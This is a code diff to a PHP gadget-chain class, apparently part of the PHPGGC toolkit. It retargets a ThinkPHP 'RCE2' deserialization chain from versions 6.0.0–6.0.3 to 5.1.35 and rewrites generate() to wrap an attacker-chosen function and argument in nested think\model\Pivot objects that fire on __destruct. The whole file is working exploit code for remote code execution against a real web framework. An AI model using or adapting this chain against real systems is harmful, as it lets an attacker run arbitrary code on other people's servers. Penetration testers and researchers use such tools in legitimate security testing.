@@ -2,16 +2,18 @@
 
 namespace GadgetChain\ThinkPHP;
 
-class RCE2 extends \PHPGGC\GadgetChain\RCE
+class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
 {
-    public static $version = '6.0.0 <= 6.0.3';
+    public static $version = '5.1.35';
     public static $vector = '__destruct';
-    public static $author = 'AFKL';
+    public static $author = '???';
+    public static $information = '';
 
     public function generate(array $parameters)
     {
-		$function = $parameters['function'];
-        $parameter = $parameters['parameter'];
-		return new \League\Flysystem\Cached\Storage\Adapter($function, $parameter);
+        $func = $parameters['function'];
+        $val = $parameters['parameter'];
+		$obj = new \think\model\Pivot(new \think\model\Pivot("", "", ""), $func, $val);
+        return $obj;
     }
 }
